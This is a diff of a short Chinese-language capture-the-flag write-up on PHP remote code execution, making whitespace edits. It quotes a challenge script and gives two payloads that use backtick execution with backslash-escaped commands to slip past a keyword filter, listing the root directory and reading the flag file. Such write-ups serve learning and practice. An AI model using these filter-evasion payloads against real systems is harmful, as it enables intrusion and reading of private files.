@@ -1,4 +1,5 @@
-#RCE 
+#RCE
+
 ```php
 <?php
 ## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？
@@ -17,7 +18,9 @@ else{
     show_source(__FILE__);
 }
 ```
-使用 print  或者 printf
+
+使用 print 或者 printf
+
 ```sh
 print`l\s /`;
 print`c\at /fffffffffflagafag`;
